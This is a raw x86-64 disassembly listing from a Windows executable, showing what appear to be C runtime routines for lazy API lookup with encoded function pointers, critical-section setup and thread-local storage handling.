   1400040be:	8b d6                	mov    %esi,%edx
   1400040c0:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1400040c7:	00 
   1400040c8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400040cd:	ff 15 d5 17 01 00    	call   *0x117d5(%rip)        # 0x1400158a8
   1400040d3:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400040d8:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400040dd:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400040e2:	48 83 c4 50          	add    $0x50,%rsp
   1400040e6:	5f                   	pop    %rdi
   1400040e7:	c3                   	ret
   1400040e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400040ed:	57                   	push   %rdi
   1400040ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400040f2:	8b fa                	mov    %edx,%edi
   1400040f4:	4c 8d 0d 3d aa 00 00 	lea    0xaa3d(%rip),%r9        # 0x14000eb38
   1400040fb:	48 8b d9             	mov    %rcx,%rbx
   1400040fe:	48 8d 15 83 f1 00 00 	lea    0xf183(%rip),%rdx        # 0x140013288
   140004105:	b9 16 00 00 00       	mov    $0x16,%ecx
   14000410a:	4c 8d 05 1f aa 00 00 	lea    0xaa1f(%rip),%r8        # 0x14000eb30
   140004111:	e8 72 00 00 00       	call   0x140004188
   140004116:	48 8b cb             	mov    %rbx,%rcx
   140004119:	48 85 c0             	test   %rax,%rax
   14000411c:	74 0a                	je     0x140004128
   14000411e:	8b d7                	mov    %edi,%edx
   140004120:	ff 15 ea 5e 01 00    	call   *0x15eea(%rip)        # 0x14001a010
   140004126:	eb 05                	jmp    0x14000412d
   140004128:	e8 7b 4e 00 00       	call   0x140008fa8
   14000412d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004132:	48 83 c4 20          	add    $0x20,%rsp
   140004136:	5f                   	pop    %rdi
   140004137:	c3                   	ret
   140004138:	40 53                	rex push %rbx
   14000413a:	48 83 ec 20          	sub    $0x20,%rsp
   14000413e:	48 8b d9             	mov    %rcx,%rbx
   140004141:	4c 8d 0d f4 a9 00 00 	lea    0xa9f4(%rip),%r9        # 0x14000eb3c
   140004148:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   14000414d:	4c 8d 05 e4 a9 00 00 	lea    0xa9e4(%rip),%r8        # 0x14000eb38
   140004154:	48 8d 15 c5 f0 00 00 	lea    0xf0c5(%rip),%rdx        # 0x140013220
   14000415b:	e8 28 00 00 00       	call   0x140004188
   140004160:	48 85 c0             	test   %rax,%rax
   140004163:	74 16                	je     0x14000417b
   140004165:	48 8b d3             	mov    %rbx,%rdx
   140004168:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   14000416f:	48 83 c4 20          	add    $0x20,%rsp
   140004173:	5b                   	pop    %rbx
   140004174:	48 ff 25 95 5e 01 00 	rex.W jmp *0x15e95(%rip)        # 0x14001a010
   14000417b:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   140004180:	48 83 c4 20          	add    $0x20,%rsp
   140004184:	5b                   	pop    %rbx
   140004185:	c3                   	ret
   140004186:	cc                   	int3
   140004187:	cc                   	int3
   140004188:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000418d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004192:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004197:	57                   	push   %rdi
   140004198:	41 54                	push   %r12
   14000419a:	41 55                	push   %r13
   14000419c:	41 56                	push   %r14
   14000419e:	41 57                	push   %r15
   1400041a0:	48 83 ec 20          	sub    $0x20,%rsp
   1400041a4:	44 8b f9             	mov    %ecx,%r15d
   1400041a7:	4c 8d 35 52 be ff ff 	lea    -0x41ae(%rip),%r14        # 0x140000000
   1400041ae:	4d 8b e1             	mov    %r9,%r12
   1400041b1:	49 8b e8             	mov    %r8,%rbp
   1400041b4:	4c 8b ea             	mov    %rdx,%r13
   1400041b7:	4b 8b 8c fe a0 83 01 	mov    0x183a0(%r14,%r15,8),%rcx
   1400041be:	00 
   1400041bf:	4c 8b 15 72 2e 01 00 	mov    0x12e72(%rip),%r10        # 0x140017038
   1400041c6:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400041ca:	41 8b c2             	mov    %r10d,%eax
   1400041cd:	49 8b d2             	mov    %r10,%rdx
   1400041d0:	48 33 d1             	xor    %rcx,%rdx
   1400041d3:	83 e0 3f             	and    $0x3f,%eax
   1400041d6:	8a c8                	mov    %al,%cl
   1400041d8:	48 d3 ca             	ror    %cl,%rdx
   1400041db:	48 3b d7             	cmp    %rdi,%rdx
   1400041de:	0f 84 5b 01 00 00    	je     0x14000433f
   1400041e4:	48 85 d2             	test   %rdx,%rdx
   1400041e7:	74 08                	je     0x1400041f1
   1400041e9:	48 8b c2             	mov    %rdx,%rax
   1400041ec:	e9 50 01 00 00       	jmp    0x140004341
   1400041f1:	4d 3b c4             	cmp    %r12,%r8
   1400041f4:	0f 84 d9 00 00 00    	je     0x1400042d3
   1400041fa:	8b 75 00             	mov    0x0(%rbp),%esi
   1400041fd:	49 8b 9c f6 00 83 01 	mov    0x18300(%r14,%rsi,8),%rbx
   140004204:	00 
   140004205:	48 85 db             	test   %rbx,%rbx
   140004208:	74 0e                	je     0x140004218
   14000420a:	48 3b df             	cmp    %rdi,%rbx
   14000420d:	0f 84 ac 00 00 00    	je     0x1400042bf
   140004213:	e9 a2 00 00 00       	jmp    0x1400042ba
   140004218:	4d 8b b4 f6 50 ea 00 	mov    0xea50(%r14,%rsi,8),%r14
   14000421f:	00 
   140004220:	33 d2                	xor    %edx,%edx
   140004222:	49 8b ce             	mov    %r14,%rcx
   140004225:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000422b:	ff 15 87 16 01 00    	call   *0x11687(%rip)        # 0x1400158b8
   140004231:	48 8b d8             	mov    %rax,%rbx
   140004234:	48 85 c0             	test   %rax,%rax
   140004237:	75 4f                	jne    0x140004288
   140004239:	ff 15 c9 15 01 00    	call   *0x115c9(%rip)        # 0x140015808
   14000423f:	83 f8 57             	cmp    $0x57,%eax
   140004242:	75 42                	jne    0x140004286
   140004244:	8d 58 b0             	lea    -0x50(%rax),%ebx
   140004247:	49 8b ce             	mov    %r14,%rcx
   14000424a:	44 8b c3             	mov    %ebx,%r8d
   14000424d:	48 8d 15 bc 0e 01 00 	lea    0x10ebc(%rip),%rdx        # 0x140015110
   140004254:	e8 97 25 00 00       	call   0x1400067f0
   140004259:	85 c0                	test   %eax,%eax
   14000425b:	74 29                	je     0x140004286
   14000425d:	44 8b c3             	mov    %ebx,%r8d
   140004260:	48 8d 15 99 0e 01 00 	lea    0x10e99(%rip),%rdx        # 0x140015100
   140004267:	49 8b ce             	mov    %r14,%rcx
   14000426a:	e8 81 25 00 00       	call   0x1400067f0
   14000426f:	85 c0                	test   %eax,%eax
   140004271:	74 13                	je     0x140004286
   140004273:	45 33 c0             	xor    %r8d,%r8d
   140004276:	33 d2                	xor    %edx,%edx
   140004278:	49 8b ce             	mov    %r14,%rcx
   14000427b:	ff 15 37 16 01 00    	call   *0x11637(%rip)        # 0x1400158b8
   140004281:	48 8b d8             	mov    %rax,%rbx
   140004284:	eb 02                	jmp    0x140004288
   140004286:	33 db                	xor    %ebx,%ebx
   140004288:	4c 8d 35 71 bd ff ff 	lea    -0x428f(%rip),%r14        # 0x140000000
   14000428f:	48 85 db             	test   %rbx,%rbx
   140004292:	75 0d                	jne    0x1400042a1
   140004294:	48 8b c7             	mov    %rdi,%rax
   140004297:	49 87 84 f6 00 83 01 	xchg   %rax,0x18300(%r14,%rsi,8)
   14000429e:	00 
   14000429f:	eb 1e                	jmp    0x1400042bf
   1400042a1:	48 8b c3             	mov    %rbx,%rax
   1400042a4:	49 87 84 f6 00 83 01 	xchg   %rax,0x18300(%r14,%rsi,8)
   1400042ab:	00 
   1400042ac:	48 85 c0             	test   %rax,%rax
   1400042af:	74 09                	je     0x1400042ba
   1400042b1:	48 8b cb             	mov    %rbx,%rcx
   1400042b4:	ff 15 ee 14 01 00    	call   *0x114ee(%rip)        # 0x1400157a8
   1400042ba:	48 85 db             	test   %rbx,%rbx
   1400042bd:	75 55                	jne    0x140004314
   1400042bf:	48 83 c5 04          	add    $0x4,%rbp
   1400042c3:	49 3b ec             	cmp    %r12,%rbp
   1400042c6:	0f 85 2e ff ff ff    	jne    0x1400041fa
   1400042cc:	4c 8b 15 65 2d 01 00 	mov    0x12d65(%rip),%r10        # 0x140017038
   1400042d3:	33 db                	xor    %ebx,%ebx
   1400042d5:	48 85 db             	test   %rbx,%rbx
   1400042d8:	74 4a                	je     0x140004324
   1400042da:	49 8b d5             	mov    %r13,%rdx
   1400042dd:	48 8b cb             	mov    %rbx,%rcx
   1400042e0:	ff 15 4a 15 01 00    	call   *0x1154a(%rip)        # 0x140015830
   1400042e6:	48 85 c0             	test   %rax,%rax
   1400042e9:	74 32                	je     0x14000431d
   1400042eb:	4c 8b 05 46 2d 01 00 	mov    0x12d46(%rip),%r8        # 0x140017038
   1400042f2:	ba 40 00 00 00       	mov    $0x40,%edx
   1400042f7:	41 8b c8             	mov    %r8d,%ecx
   1400042fa:	83 e1 3f             	and    $0x3f,%ecx
   1400042fd:	2b d1                	sub    %ecx,%edx
   1400042ff:	8a ca                	mov    %dl,%cl
   140004301:	48 8b d0             	mov    %rax,%rdx
   140004304:	48 d3 ca             	ror    %cl,%rdx
   140004307:	49 33 d0             	xor    %r8,%rdx
   14000430a:	4b 87 94 fe a0 83 01 	xchg   %rdx,0x183a0(%r14,%r15,8)
   140004311:	00 
   140004312:	eb 2d                	jmp    0x140004341
   140004314:	4c 8b 15 1d 2d 01 00 	mov    0x12d1d(%rip),%r10        # 0x140017038
   14000431b:	eb b8                	jmp    0x1400042d5
   14000431d:	4c 8b 15 14 2d 01 00 	mov    0x12d14(%rip),%r10        # 0x140017038
   140004324:	41 8b c2             	mov    %r10d,%eax
   140004327:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000432c:	83 e0 3f             	and    $0x3f,%eax
   14000432f:	2b c8                	sub    %eax,%ecx
   140004331:	48 d3 cf             	ror    %cl,%rdi
   140004334:	49 33 fa             	xor    %r10,%rdi
   140004337:	4b 87 bc fe a0 83 01 	xchg   %rdi,0x183a0(%r14,%r15,8)
   14000433e:	00 
   14000433f:	33 c0                	xor    %eax,%eax
   140004341:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004346:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000434b:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004350:	48 83 c4 20          	add    $0x20,%rsp
   140004354:	41 5f                	pop    %r15
   140004356:	41 5e                	pop    %r14
   140004358:	41 5d                	pop    %r13
   14000435a:	41 5c                	pop    %r12
   14000435c:	5f                   	pop    %rdi
   14000435d:	c3                   	ret
   14000435e:	cc                   	int3
   14000435f:	cc                   	int3
   140004360:	40 53                	rex push %rbx
   140004362:	48 83 ec 20          	sub    $0x20,%rsp
   140004366:	33 db                	xor    %ebx,%ebx
   140004368:	48 8d 15 41 41 01 00 	lea    0x14141(%rip),%rdx        # 0x1400184b0
   14000436f:	45 33 c0             	xor    %r8d,%r8d
   140004372:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004376:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000437a:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000437f:	e8 24 fc ff ff       	call   0x140003fa8
   140004384:	85 c0                	test   %eax,%eax
   140004386:	74 11                	je     0x140004399
   140004388:	ff 05 52 43 01 00    	incl   0x14352(%rip)        # 0x1400186e0
   14000438e:	ff c3                	inc    %ebx
   140004390:	83 fb 0e             	cmp    $0xe,%ebx
   140004393:	72 d3                	jb     0x140004368
   140004395:	b0 01                	mov    $0x1,%al
   140004397:	eb 09                	jmp    0x1400043a2
   140004399:	33 c9                	xor    %ecx,%ecx
   14000439b:	e8 08 00 00 00       	call   0x1400043a8
   1400043a0:	32 c0                	xor    %al,%al
   1400043a2:	48 83 c4 20          	add    $0x20,%rsp
   1400043a6:	5b                   	pop    %rbx
   1400043a7:	c3                   	ret
   1400043a8:	40 53                	rex push %rbx
   1400043aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400043ae:	8b 1d 2c 43 01 00    	mov    0x1432c(%rip),%ebx        # 0x1400186e0
   1400043b4:	eb 1d                	jmp    0x1400043d3
   1400043b6:	48 8d 05 f3 40 01 00 	lea    0x140f3(%rip),%rax        # 0x1400184b0
   1400043bd:	ff cb                	dec    %ebx
   1400043bf:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400043c3:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400043c7:	ff 15 9b 13 01 00    	call   *0x1139b(%rip)        # 0x140015768
   1400043cd:	ff 0d 0d 43 01 00    	decl   0x1430d(%rip)        # 0x1400186e0
   1400043d3:	85 db                	test   %ebx,%ebx
   1400043d5:	75 df                	jne    0x1400043b6
   1400043d7:	b0 01                	mov    $0x1,%al
   1400043d9:	48 83 c4 20          	add    $0x20,%rsp
   1400043dd:	5b                   	pop    %rbx
   1400043de:	c3                   	ret
   1400043df:	cc                   	int3
   1400043e0:	48 63 c1             	movslq %ecx,%rax
   1400043e3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400043e7:	48 8d 05 c2 40 01 00 	lea    0x140c2(%rip),%rax        # 0x1400184b0
   1400043ee:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400043f2:	48 ff 25 77 13 01 00 	rex.W jmp *0x11377(%rip)        # 0x140015770
   1400043f9:	cc                   	int3
   1400043fa:	cc                   	int3
   1400043fb:	cc                   	int3
   1400043fc:	48 63 c1             	movslq %ecx,%rax
   1400043ff:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140004403:	48 8d 05 a6 40 01 00 	lea    0x140a6(%rip),%rax        # 0x1400184b0
   14000440a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000440e:	48 ff 25 9b 14 01 00 	rex.W jmp *0x1149b(%rip)        # 0x1400158b0
   140004415:	cc                   	int3
   140004416:	cc                   	int3
   140004417:	cc                   	int3
   140004418:	48 83 ec 28          	sub    $0x28,%rsp
   14000441c:	ff 15 16 14 01 00    	call   *0x11416(%rip)        # 0x140015838
   140004422:	48 85 c0             	test   %rax,%rax
   140004425:	48 89 05 bc 42 01 00 	mov    %rax,0x142bc(%rip)        # 0x1400186e8
   14000442c:	0f 95 c0             	setne  %al
   14000442f:	48 83 c4 28          	add    $0x28,%rsp
   140004433:	c3                   	ret
   140004434:	48 83 25 ac 42 01 00 	andq   $0x0,0x142ac(%rip)        # 0x1400186e8
   14000443b:	00 
   14000443c:	b0 01                	mov    $0x1,%al
   14000443e:	c3                   	ret
   14000443f:	cc                   	int3
   140004440:	48 83 ec 28          	sub    $0x28,%rsp
   140004444:	48 8d 0d 9d 02 00 00 	lea    0x29d(%rip),%rcx        # 0x1400046e8
   14000444b:	e8 2c fa ff ff       	call   0x140003e7c
   140004450:	89 05 12 2c 01 00    	mov    %eax,0x12c12(%rip)        # 0x140017068
   140004456:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004459:	75 04                	jne    0x14000445f
   14000445b:	32 c0                	xor    %al,%al
   14000445d:	eb 15                	jmp    0x140004474
   14000445f:	e8 b8 01 00 00       	call   0x14000461c
   140004464:	48 85 c0             	test   %rax,%rax
   140004467:	75 09                	jne    0x140004472
   140004469:	33 c9                	xor    %ecx,%ecx
   14000446b:	e8 0c 00 00 00       	call   0x14000447c
   140004470:	eb e9                	jmp    0x14000445b
   140004472:	b0 01                	mov    $0x1,%al
   140004474:	48 83 c4 28          	add    $0x28,%rsp
   140004478:	c3                   	ret
   140004479:	cc                   	int3
   14000447a:	cc                   	int3
   14000447b:	cc                   	int3
   14000447c:	48 83 ec 28          	sub    $0x28,%rsp
   140004480:	8b 0d e2 2b 01 00    	mov    0x12be2(%rip),%ecx        # 0x140017068
   140004486:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004489:	74 0c                	je     0x140004497
   14000448b:	e8 34 fa ff ff       	call   0x140003ec4
   140004490:	83 0d d1 2b 01 00 ff 	orl    $0xffffffff,0x12bd1(%rip)        # 0x140017068
   140004497:	b0 01                	mov    $0x1,%al
   140004499:	48 83 c4 28          	add    $0x28,%rsp
   14000449d:	c3                   	ret
   14000449e:	cc                   	int3
   14000449f:	cc                   	int3
   1400044a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400044a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400044aa:	57                   	push   %rdi
   1400044ab:	48 83 ec 20          	sub    $0x20,%rsp
   1400044af:	ff 15 53 13 01 00    	call   *0x11353(%rip)        # 0x140015808
   1400044b5:	8b 0d ad 2b 01 00    	mov    0x12bad(%rip),%ecx        # 0x140017068
   1400044bb:	8b d8                	mov    %eax,%ebx
   1400044bd:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400044c0:	74 1f                	je     0x1400044e1
   1400044c2:	e8 45 fa ff ff       	call   0x140003f0c
   1400044c7:	48 8b f8             	mov    %rax,%rdi
   1400044ca:	48 85 c0             	test   %rax,%rax
   1400044cd:	74 0c                	je     0x1400044db
   1400044cf:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400044d3:	75 73                	jne    0x140004548
   1400044d5:	33 ff                	xor    %edi,%edi
   1400044d7:	33 f6                	xor    %esi,%esi
   1400044d9:	eb 70                	jmp    0x14000454b
   1400044db:	8b 0d 87 2b 01 00    	mov    0x12b87(%rip),%ecx        # 0x140017068
   1400044e1:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400044e5:	e8 6a fa ff ff       	call   0x140003f54
   1400044ea:	85 c0                	test   %eax,%eax
   1400044ec:	74 e7                	je     0x1400044d5
   1400044ee:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400044f3:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400044f8:	e8 1b 22 00 00       	call   0x140006718
   1400044fd:	8b 0d 65 2b 01 00    	mov    0x12b65(%rip),%ecx        # 0x140017068
   140004503:	48 8b f8             	mov    %rax,%rdi
   140004506:	48 85 c0             	test   %rax,%rax
   140004509:	75 10                	jne    0x14000451b
   14000450b:	33 d2                	xor    %edx,%edx
   14000450d:	e8 42 fa ff ff       	call   0x140003f54
   140004512:	33 c9                	xor    %ecx,%ecx
   140004514:	e8 bb 12 00 00       	call   0x1400057d4
   140004519:	eb ba                	jmp    0x1400044d5
   14000451b:	48 8b d7             	mov    %rdi,%rdx
   14000451e:	e8 31 fa ff ff       	call   0x140003f54
   140004523:	85 c0                	test   %eax,%eax
   140004525:	75 12                	jne    0x140004539
   140004527:	8b 0d 3b 2b 01 00    	mov    0x12b3b(%rip),%ecx        # 0x140017068
   14000452d:	33 d2                	xor    %edx,%edx
   14000452f:	e8 20 fa ff ff       	call   0x140003f54
   140004534:	48 8b cf             	mov    %rdi,%rcx
   140004537:	eb db                	jmp    0x140004514
   140004539:	48 8b cf             	mov    %rdi,%rcx
   14000453c:	e8 2f 02 00 00       	call   0x140004770
   140004541:	33 c9                	xor    %ecx,%ecx
   140004543:	e8 8c 12 00 00       	call   0x1400057d4
   140004548:	48 8b f7             	mov    %rdi,%rsi
   14000454b:	8b cb                	mov    %ebx,%ecx
   14000454d:	ff 15 b5 13 01 00    	call   *0x113b5(%rip)        # 0x140015908
   140004553:	48 f7 df             	neg    %rdi
   140004556:	48 1b c0             	sbb    %rax,%rax
   140004559:	48 23 c6             	and    %rsi,%rax
   14000455c:	74 10                	je     0x14000456e
   14000455e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004563:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004568:	48 83 c4 20          	add    $0x20,%rsp
   14000456c:	5f                   	pop    %rdi
   14000456d:	c3                   	ret
   14000456e:	e8 d9 f4 ff ff       	call   0x140003a4c
   140004573:	cc                   	int3
   140004574:	40 53                	rex push %rbx
   140004576:	48 83 ec 20          	sub    $0x20,%rsp
   14000457a:	8b 0d e8 2a 01 00    	mov    0x12ae8(%rip),%ecx        # 0x140017068
   140004580:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004583:	74 1b                	je     0x1400045a0
   140004585:	e8 82 f9 ff ff       	call   0x140003f0c
   14000458a:	48 8b d8             	mov    %rax,%rbx
   14000458d:	48 85 c0             	test   %rax,%rax
   140004590:	74 08                	je     0x14000459a
   140004592:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004596:	74 7d                	je     0x140004615
   140004598:	eb 6d                	jmp    0x140004607
   14000459a:	8b 0d c8 2a 01 00    	mov    0x12ac8(%rip),%ecx        # 0x140017068
   1400045a0:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400045a4:	e8 ab f9 ff ff       	call   0x140003f54
   1400045a9:	85 c0                	test   %eax,%eax
   1400045ab:	74 68                	je     0x140004615
   1400045ad:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400045b2:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400045b7:	e8 5c 21 00 00       	call   0x140006718
   1400045bc:	8b 0d a6 2a 01 00    	mov    0x12aa6(%rip),%ecx        # 0x140017068
   1400045c2:	48 8b d8             	mov    %rax,%rbx
   1400045c5:	48 85 c0             	test   %rax,%rax
   1400045c8:	75 10                	jne    0x1400045da
   1400045ca:	33 d2                	xor    %edx,%edx
   1400045cc:	e8 83 f9 ff ff       	call   0x140003f54
   1400045d1:	33 c9                	xor    %ecx,%ecx
   1400045d3:	e8 fc 11 00 00       	call   0x1400057d4
   1400045d8:	eb 3b                	jmp    0x140004615
   1400045da:	48 8b d3             	mov    %rbx,%rdx
   1400045dd:	e8 72 f9 ff ff       	call   0x140003f54
   1400045e2:	85 c0                	test   %eax,%eax
   1400045e4:	75 12                	jne    0x1400045f8
   1400045e6:	8b 0d 7c 2a 01 00    	mov    0x12a7c(%rip),%ecx        # 0x140017068
   1400045ec:	33 d2                	xor    %edx,%edx
   1400045ee:	e8 61 f9 ff ff       	call   0x140003f54
   1400045f3:	48 8b cb             	mov    %rbx,%rcx
   1400045f6:	eb db                	jmp    0x1400045d3
   1400045f8:	48 8b cb             	mov    %rbx,%rcx
   1400045fb:	e8 70 01 00 00       	call   0x140004770
   140004600:	33 c9                	xor    %ecx,%ecx
   140004602:	e8 cd 11 00 00       	call   0x1400057d4
   140004607:	48 85 db             	test   %rbx,%rbx
   14000460a:	74 09                	je     0x140004615
   14000460c:	48 8b c3             	mov    %rbx,%rax
   14000460f:	48 83 c4 20          	add    $0x20,%rsp
   140004613:	5b                   	pop    %rbx
   140004614:	c3                   	ret
   140004615:	e8 32 f4 ff ff       	call   0x140003a4c
   14000461a:	cc                   	int3
   14000461b:	cc                   	int3
   14000461c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004621:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004626:	57                   	push   %rdi
   140004627:	48 83 ec 20          	sub    $0x20,%rsp
   14000462b:	ff 15 d7 11 01 00    	call   *0x111d7(%rip)        # 0x140015808
   140004631:	8b 0d 31 2a 01 00    	mov    0x12a31(%rip),%ecx        # 0x140017068
   140004637:	8b d8                	mov    %eax,%ebx
   140004639:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000463c:	74 1f                	je     0x14000465d
   14000463e:	e8 c9 f8 ff ff       	call   0x140003f0c
   140004643:	48 8b f8             	mov    %rax,%rdi
   140004646:	48 85 c0             	test   %rax,%rax
   140004649:	74 0c                	je     0x140004657
   14000464b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000464f:	75 73                	jne    0x1400046c4
   140004651:	33 ff                	xor    %edi,%edi
   140004653:	33 f6                	xor    %esi,%esi
   140004655:	eb 70                	jmp    0x1400046c7
   140004657:	8b 0d 0b 2a 01 00    	mov    0x12a0b(%rip),%ecx        # 0x140017068
   14000465d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140004661:	e8 ee f8 ff ff       	call   0x140003f54
   140004666:	85 c0                	test   %eax,%eax
   140004668:	74 e7                	je     0x140004651
   14000466a:	ba c8 03 00 00       	mov    $0x3c8,%edx
   14000466f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004674:	e8 9f 20 00 00       	call   0x140006718
   140004679:	8b 0d e9 29 01 00    	mov    0x129e9(%rip),%ecx        # 0x140017068
   14000467f:	48 8b f8             	mov    %rax,%rdi
   140004682:	48 85 c0             	test   %rax,%rax
   140004685:	75 10                	jne    0x140004697
   140004687:	33 d2                	xor    %edx,%edx
   140004689:	e8 c6 f8 ff ff       	call   0x140003f54
   14000468e:	33 c9                	xor    %ecx,%ecx
   140004690:	e8 3f 11 00 00       	call   0x1400057d4
   140004695:	eb ba                	jmp    0x140004651
   140004697:	48 8b d7             	mov    %rdi,%rdx
   14000469a:	e8 b5 f8 ff ff       	call   0x140003f54
   14000469f:	85 c0                	test   %eax,%eax
   1400046a1:	75 12                	jne    0x1400046b5
   1400046a3:	8b 0d bf 29 01 00    	mov    0x129bf(%rip),%ecx        # 0x140017068
   1400046a9:	33 d2                	xor    %edx,%edx
   1400046ab:	e8 a4 f8 ff ff       	call   0x140003f54
   1400046b0:	48 8b cf             	mov    %rdi,%rcx
   1400046b3:	eb db                	jmp    0x140004690
   1400046b5:	48 8b cf             	mov    %rdi,%rcx
   1400046b8:	e8 b3 00 00 00       	call   0x140004770
   1400046bd:	33 c9                	xor    %ecx,%ecx
   1400046bf:	e8 10 11 00 00       	call   0x1400057d4
   1400046c4:	48 8b f7             	mov    %rdi,%rsi
   1400046c7:	8b cb                	mov    %ebx,%ecx
   1400046c9:	ff 15 39 12 01 00    	call   *0x11239(%rip)        # 0x140015908
   1400046cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046d4:	48 f7 df             	neg    %rdi
   1400046d7:	48 1b c0             	sbb    %rax,%rax
   1400046da:	48 23 c6             	and    %rsi,%rax
   1400046dd:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400046e2:	48 83 c4 20          	add    $0x20,%rsp
   1400046e6:	5f                   	pop    %rdi
   1400046e7:	c3                   	ret
   1400046e8:	48 85 c9             	test   %rcx,%rcx
   1400046eb:	74 1a                	je     0x140004707
   1400046ed:	53                   	push   %rbx
   1400046ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400046f2:	48 8b d9             	mov    %rcx,%rbx
   1400046f5:	e8 46 01 00 00       	call   0x140004840
   1400046fa:	48 8b cb             	mov    %rbx,%rcx
   1400046fd:	e8 d2 10 00 00       	call   0x1400057d4
   140004702:	48 83 c4 20          	add    $0x20,%rsp
   140004706:	5b                   	pop    %rbx
   140004707:	c3                   	ret
   140004708:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000470d:	57                   	push   %rdi
   14000470e:	48 83 ec 20          	sub    $0x20,%rsp
   140004712:	48 8b f9             	mov    %rcx,%rdi
   140004715:	48 8b da             	mov    %rdx,%rbx
   140004718:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   14000471f:	48 85 c9             	test   %rcx,%rcx
   140004722:	74 2c                	je     0x140004750
   140004724:	e8 6b 23 00 00       	call   0x140006a94
   140004729:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140004730:	48 3b 0d 11 44 01 00 	cmp    0x14411(%rip),%rcx        # 0x140018b48
   140004737:	74 17                	je     0x140004750
   140004739:	48 8d 05 70 2e 01 00 	lea    0x12e70(%rip),%rax        # 0x1400175b0
   140004740:	48 3b c8             	cmp    %rax,%rcx
   140004743:	74 0b                	je     0x140004750
   140004745:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140004749:	75 05                	jne    0x140004750
   14000474b:	e8 ec 23 00 00       	call   0x140006b3c
   140004750:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   140004757:	48 85 db             	test   %rbx,%rbx
   14000475a:	74 08                	je     0x140004764
   14000475c:	48 8b cb             	mov    %rbx,%rcx
   14000475f:	e8 a4 22 00 00       	call   0x140006a08
   140004764:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004769:	48 83 c4 20          	add    $0x20,%rsp
   14000476d:	5f                   	pop    %rdi
   14000476e:	c3                   	ret
   14000476f:	cc                   	int3
   140004770:	40 55                	rex push %rbp
   140004772:	48 8b ec             	mov    %rsp,%rbp
   140004775:	48 83 ec 50          	sub    $0x50,%rsp
   140004779:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   14000477d:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140004781:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004785:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140004789:	ba 01 00 00 00       	mov    $0x1,%edx
   14000478e:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004792:	b8 05 00 00 00       	mov    $0x5,%eax
   140004797:	89 45 20             	mov    %eax,0x20(%rbp)
   14000479a:	89 45 28             	mov    %eax,0x28(%rbp)
   14000479d:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400047a1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400047a5:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1400047a9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400047ad:	b8 04 00 00 00       	mov    $0x4,%eax
   1400047b2:	89 45 d0             	mov    %eax,-0x30(%rbp)
   1400047b5:	89 45 d4             	mov    %eax,-0x2c(%rbp)
